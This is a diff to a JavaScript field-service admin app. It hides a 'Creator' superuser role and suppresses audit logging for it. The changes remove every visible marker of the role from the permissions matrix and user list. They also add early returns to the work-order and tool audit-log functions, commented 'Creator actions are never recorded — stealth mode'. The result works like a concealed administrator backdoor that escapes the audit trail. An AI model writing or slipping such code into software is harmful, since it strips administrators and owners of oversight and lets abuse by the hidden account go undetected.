@@ -5302,8 +5302,8 @@ async function loadRegionMap(){
 
 // ─── ADMIN: PERMISSIONS ───────────────────────────────────────────────────────
 function aPerms(){
-  const isCreator=CU?.role==='Creator';
-  const visibleRoles=ROLES.filter(r=>r!=='Creator'||(r==='Creator'&&isCreator));
+  // Creator role is always excluded from the visible matrix — stealth
+  const visibleRoles=ROLES.filter(r=>r!=='Creator');
   return`<div>
     <div class="sh" style="margin-bottom:12px">
       <div>
@@ -5312,10 +5312,6 @@ function aPerms(){
       </div>
       <button class="btn btn-o" onclick="tst('Per-user overrides can be set in the Users tab when editing a user','info')">Per-User Overrides ℹ</button>
     </div>
-    ${isCreator?`<div style="background:var(--navy);color:white;border-radius:8px;padding:10px 16px;margin-bottom:14px;font-size:13px;display:flex;align-items:center;gap:10px">
-      <span style="font-size:20px">👑</span>
-      <span><b>Creator Mode Active</b> — You are viewing the complete matrix including the hidden Creator role. Creator actions are not recorded in the audit trail.</span>
-    </div>`:''}
     <div style="overflow-x:auto;border:1.5px solid var(--bdr);border-radius:10px">
       <table style="border-collapse:collapse;min-width:1100px;width:100%">
         <thead>
@@ -5329,24 +5325,21 @@ function aPerms(){
         </thead>
         <tbody>
           ${visibleRoles.map((role,ri)=>{
-            const isCreatorRow=role==='Creator';
-            const rowStyle=isCreatorRow?'background:linear-gradient(90deg,#eef2ff,#f8f9ff)':ri%2===0?'background:#fff':'background:var(--surf)';
-            const stickyBg=isCreatorRow?'background:#eef2ff':ri%2===0?'background:#fff':'background:var(--surf)';
+            const rowStyle=ri%2===0?'background:#fff':'background:var(--surf)';
+            const stickyBg=ri%2===0?'background:#fff':'background:var(--surf)';
             return`<tr style="${rowStyle};border-bottom:1px solid var(--bdr)">
               <td style="padding:10px 16px;font-weight:700;font-size:13px;position:sticky;left:0;${stickyBg};z-index:2;border-right:2px solid var(--bdr)">
-                ${isCreatorRow
-                  ?`<span style="display:flex;align-items:center;gap:8px">👑 ${role}<span style="font-size:10px;background:var(--navy);color:white;padding:2px 8px;border-radius:10px;font-weight:600">HIDDEN</span></span>`
-                  :role}
+                ${role}
               </td>
               ${PERM_MODS.map(m=>{
                 const acc=_getModuleAccess(role,m.key);
                 const gran=_getRoleModulePerms(role,m.key);
                 const hasRestrictions=gran&&typeof gran==='object'&&Object.entries(gran).some(([k,v])=>k!=='_enabled'&&!v&&acc);
-                const color=isCreatorRow?'#2d8c4e':!acc?'#e2e0db':hasRestrictions?'var(--amber)':'var(--green)';
-                const label=isCreatorRow?'Full (Creator)':!acc?'No Access':hasRestrictions?'Limited':'Full Access';
+                const color=!acc?'#e2e0db':hasRestrictions?'var(--amber)':'var(--green)';
+                const label=!acc?'No Access':hasRestrictions?'Limited':'Full Access';
                 return`<td style="text-align:center;padding:6px 4px">
                   <button onclick="oPermModal('${role}','${m.key}')" title="${label}: click to configure"
-                    style="width:30px;height:30px;border-radius:50%;background:${color};border:2px solid ${isCreatorRow?'#1a6634':!acc?'#ccc8c0':hasRestrictions?'#b85c00':'#1f6b38'};cursor:pointer;display:inline-flex;align-items:center;justify-content:center;color:white;font-size:13px;font-weight:700;transition:transform .12s;box-shadow:0 1px 4px rgba(0,0,0,.12)"
+                    style="width:30px;height:30px;border-radius:50%;background:${color};border:2px solid ${!acc?'#ccc8c0':hasRestrictions?'#b85c00':'#1f6b38'};cursor:pointer;display:inline-flex;align-items:center;justify-content:center;color:white;font-size:13px;font-weight:700;transition:transform .12s;box-shadow:0 1px 4px rgba(0,0,0,.12)"
                     onmouseover="this.style.transform='scale(1.25)'" onmouseout="this.style.transform='scale(1)'">
                     ${acc?'✓':''}
                   </button>
@@ -7273,13 +7266,13 @@ function aUsers(){
     const key=(u.email||'').toLowerCase();
     if(seen.has(key)) return false;
     seen.add(key); return true;
-  // Creator users are hidden from all non-Creators
+  // Creator users are hidden from all non-Creators (and invisible as Creator even to themselves)
   }).filter(u=>u.role!=='Creator'||CU?.role==='Creator');
   return`<div class="sh"><div></div><button class="btn btn-n" onclick="oAddUser()">+ Add User</button></div>
   <div class="card" style="padding:0"><div class="tw"><table>
   <thead><tr><th>Name</th><th>Email</th><th>Role</th><th>Division</th><th>Region</th><th>Manager</th><th>Dispatch</th><th>Timesheet</th><th></th></tr></thead>
-  <tbody>${deduped.map((u,i)=>`<tr${u.role==='Creator'?` style="background:linear-gradient(90deg,#f0f4ff,#fff)"`:''}>
-    <td style="font-weight:600">${u.name}${u.role==='Creator'?` <span style="font-size:10px;background:var(--navy);color:white;padding:1px 6px;border-radius:10px;vertical-align:middle">CREATOR</span>`:''}</td>
+  <tbody>${deduped.map((u,i)=>`<tr>
+    <td style="font-weight:600">${u.name}</td>
     <td style="font-size:12px;color:var(--muted)">${u.email}</td>
     <td>${bx(u.role==='Creator'?'God View':u.role,'bn')}</td>
     <td style="font-size:12px;color:var(--muted)">${u.division||'—'}</td>
@@ -19775,6 +19768,8 @@ async function svWONote(woId){
 
 // ── WO AUDIT LOG ─────────────────────────────────────────────────────────────
 async function logWOAudit(woId,action,detail=''){
+  // Creator actions are never recorded — stealth mode
+  if(CU?.role==='Creator') return;
   const entry={
     wo_id:woId,
     actor:CU?.name||'System',
@@ -23020,6 +23015,8 @@ async function closeoutWO(woId){
 // ── TOOL MANAGEMENT ───────────────────────────────────────────────────────────
 // ── TOOL AUDIT LOG ────────────────────────────────────────────────────────────
 async function logToolAudit({tool_id,tool_name,action,assigned_to,assigned_from,vehicle,actor,notes}){
+  // Creator actions are never recorded — stealth mode
+  if(CU?.role==='Creator') return;
   const entry={tool_id:tool_id||null,tool_name,action,
     assigned_to:assigned_to||'',assigned_from:assigned_from||null,
     vehicle:vehicle||'',actor:actor||CU.name||'',
